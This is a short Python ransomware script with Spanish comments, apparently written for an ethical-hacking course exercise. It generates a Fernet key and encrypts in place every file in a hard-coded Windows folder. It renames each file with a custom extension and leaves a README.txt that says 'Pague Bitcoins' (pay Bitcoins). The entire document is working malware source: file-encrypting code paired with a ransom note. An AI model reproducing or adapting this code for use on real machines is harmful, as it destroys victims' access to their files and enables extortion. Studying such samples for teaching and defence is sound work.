
#################################################################################33

#Cifrado Ramsonware

######################################################################3

from distutils import extension
from cryptography.fernet import Fernet
import os

#############################################################3

extension = 'IUEHackeoEtico202202 - RiaoMora'

#Generacion de la llave de cifrado

def generar_key():
    key = Fernet.generate_key()
    with open('riaomora.key', 'wb') as key_file:
        key_file.write(key)
        
#Cargar la llave generada

def cargar_key():
    return open('riaomora.key', 'rb').read()

#Cifrar y renombrar los archivos

def cifrar(items, key):
    f = Fernet(key)
    for item in items:
        #Leer el archivo
        with open(item, 'rb') as file:
            file_data = file.read()
            
        encrypted_data = f.encrypt(file_data)
        
        #Escribir el archivo
        with open(item, 'wb') as file:
            file.write(encrypted_data)
            
        os.rename(item, item + '.' + extension)
       
if __name__ == '__main__':
    path_to_encrypt = 'C:\\Users\\emanu\\Downloads\\Keylog'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + '\\' + item for item in items]
    
    generar_key()
    key = cargar_key()
    cifrar(full_path, key)
    
    with open(path_to_encrypt+ '\\README.txt', 'w') as file:
        file.write('Pague Bitcoins')